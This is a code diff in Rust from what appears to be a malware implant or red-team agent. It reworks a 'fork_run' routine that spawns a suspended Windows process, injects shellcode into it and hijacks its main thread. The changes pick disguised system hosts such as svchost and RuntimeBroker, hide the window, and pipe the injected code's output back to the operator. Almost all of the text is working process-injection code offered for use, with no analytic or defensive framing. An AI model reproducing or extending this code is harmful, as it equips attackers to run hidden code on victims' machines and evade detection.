@@ -284,42 +284,81 @@ fn blockdlls() -> String {
 
 // ── FORK_RUN ──────────────────────────────────────────────────────────────────
 // Spawn a sacrificial process suspended, inject shellcode, hijack its main
-// thread to execute it.  Mirrors the C/Go/Nim FORK_RUN behaviour.
+// thread, capture stdout/stderr and return the output.
+
+#[repr(C)]
+struct FrkSa { length: u32, sd: *mut core::ffi::c_void, inherit: i32 }
+
+#[link(name = "kernel32")]
+extern "system" {
+    fn CreatePipe(r: *mut isize, w: *mut isize, sa: *const FrkSa, sz: u32) -> i32;
+    fn SetHandleInformation(h: isize, mask: u32, flags: u32) -> i32;
+    fn PeekNamedPipe(p: isize, buf: *mut u8, sz: u32, rd: *mut u32, av: *mut u32, lft: *mut u32) -> i32;
+    fn ReadFile(h: isize, buf: *mut u8, n: u32, rd: *mut u32, ov: *const core::ffi::c_void) -> i32;
+    fn GetTickCount() -> u32;
+    fn TerminateProcess(h: isize, code: u32) -> i32;
+}
 
 unsafe fn fork_run_sc(sc: &[u8], process: &str) -> String {
     let proc_path = if process.is_empty() {
-        "C:\\Windows\\System32\\notepad.exe"
+        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
+        let candidates = [
+            format!(r"{}\System32\RuntimeBroker.exe", sysroot),
+            format!(r"{}\System32\dllhost.exe", sysroot),
+            format!(r"{}\System32\svchost.exe", sysroot),
+        ];
+        candidates.iter()
+            .find(|c| std::path::Path::new(c.as_str()).exists())
+            .cloned()
+            .unwrap_or_else(|| format!(r"{}\System32\svchost.exe", sysroot))
     } else {
-        process
+        process.to_string()
     };
+
+    // Create stdout/stderr pipe for output capture
+    let sa = FrkSa { length: std::mem::size_of::<FrkSa>() as u32, sd: std::ptr::null_mut(), inherit: 1 };
+    let mut out_rd: isize = -1isize; // INVALID_HANDLE_VALUE
+    let mut out_wr: isize = -1isize;
+    let piped = CreatePipe(&mut out_rd, &mut out_wr, &sa, 0) != 0;
+    if piped { SetHandleInformation(out_rd, 1, 0); } // read end non-inheritable
 
     let mut si: STARTUPINFOW = std::mem::zeroed();
     si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+    si.dwFlags = 0x0000_0001; // STARTF_USESHOWWINDOW
+    if piped {
+        si.dwFlags |= 0x0000_0100; // STARTF_USESTDHANDLES
+        si.hStdInput  = 0;
+        si.hStdOutput = out_wr;
+        si.hStdError  = out_wr;
+    }
     let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-    let mut target_w = wide(proc_path);
+    let mut target_w = wide(&proc_path);
 
     if CreateProcessW(
         std::ptr::null(), target_w.as_mut_ptr(),
-        std::ptr::null(), std::ptr::null(), 0,
-        CREATE_SUSPENDED, std::ptr::null(), std::ptr::null(),
+        std::ptr::null(), std::ptr::null(), if piped { 1 } else { 0 },
+        CREATE_SUSPENDED | 0x0800_0000, // CREATE_NO_WINDOW
+        std::ptr::null(), std::ptr::null(),
         &si, &mut pi,
     ) == 0 {
+        if piped { CloseHandle(out_rd); CloseHandle(out_wr); }
         return format!("CreateProcessW({}) failed (err {})", proc_path, GetLastError());
     }
+    if piped { CloseHandle(out_wr); } // parent closes write end → EOF when child exits
 
     let mem = VirtualAllocEx(
         pi.hProcess, std::ptr::null(), sc.len(),
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
     );
     if mem.is_null() {
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
+        TerminateProcess(pi.hProcess, 1);
+        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        if piped { CloseHandle(out_rd); }
         return format!("VirtualAllocEx failed (err {})", GetLastError());
     }
 
     let mut written = 0usize;
     WriteProcessMemory(pi.hProcess, mem, sc.as_ptr() as *const _, sc.len(), &mut written);
-
     let mut old = 0u32;
     VirtualProtectEx(pi.hProcess, mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
 
@@ -333,10 +372,53 @@ unsafe fn fork_run_sc(sc: &[u8], process: &str) -> String {
     let child_pid = pi.dwProcessId;
     ResumeThread(pi.hThread);
     CloseHandle(pi.hThread);
-    WaitForSingleObject(pi.hProcess, 60_000);
+
+    if !piped {
+        WaitForSingleObject(pi.hProcess, 60_000);
+        CloseHandle(pi.hProcess);
+        return format!("[+] fork_run: {} B shellcode executed in {} (PID {})", sc.len(), proc_path, child_pid);
+    }
+
+    // Drain output pipe with 60s timeout
+    let mut output: Vec<u8> = Vec::new();
+    let mut buf = [0u8; 8192];
+    let deadline = GetTickCount().wrapping_add(60_000);
+    loop {
+        if GetTickCount().wrapping_sub(deadline) < 0x8000_0000 { break; } // past deadline
+        let mut avail: u32 = 0;
+        if PeekNamedPipe(out_rd, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 { break; }
+        if avail > 0 {
+            let to_read = avail.min(buf.len() as u32);
+            let mut nr: u32 = 0;
+            ReadFile(out_rd, buf.as_mut_ptr(), to_read, &mut nr, std::ptr::null());
+            if nr > 0 { output.extend_from_slice(&buf[..nr as usize]); }
+        } else {
+            if WaitForSingleObject(pi.hProcess, 50) != 0x0000_0102 { // WAIT_TIMEOUT
+                // Child exited — drain remainder
+                loop {
+                    avail = 0;
+                    if PeekNamedPipe(out_rd, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut()) == 0 || avail == 0 { break; }
+                    let to_read = avail.min(buf.len() as u32);
+                    let mut nr: u32 = 0;
+                    ReadFile(out_rd, buf.as_mut_ptr(), to_read, &mut nr, std::ptr::null());
+                    if nr > 0 { output.extend_from_slice(&buf[..nr as usize]); } else { break; }
+                }
+                break;
+            }
+        }
+    }
+    CloseHandle(out_rd);
+
+    let timed_out = GetTickCount().wrapping_sub(deadline) >= 0x8000_0000;
+    if timed_out {
+        TerminateProcess(pi.hProcess, 1);
+        output.extend_from_slice(b"\n[!] fork-run: timed out (60s)");
+    }
+    WaitForSingleObject(pi.hProcess, 5_000);
     CloseHandle(pi.hProcess);
 
-    format!("[+] fork_run: {} B shellcode executed in {} (PID {})", sc.len(), proc_path, child_pid)
+    if output.is_empty() { return "(no output)".into(); }
+    String::from_utf8_lossy(&output).into_owned()
 }
 
 // ── FORK_TOKEN ────────────────────────────────────────────────────────────────
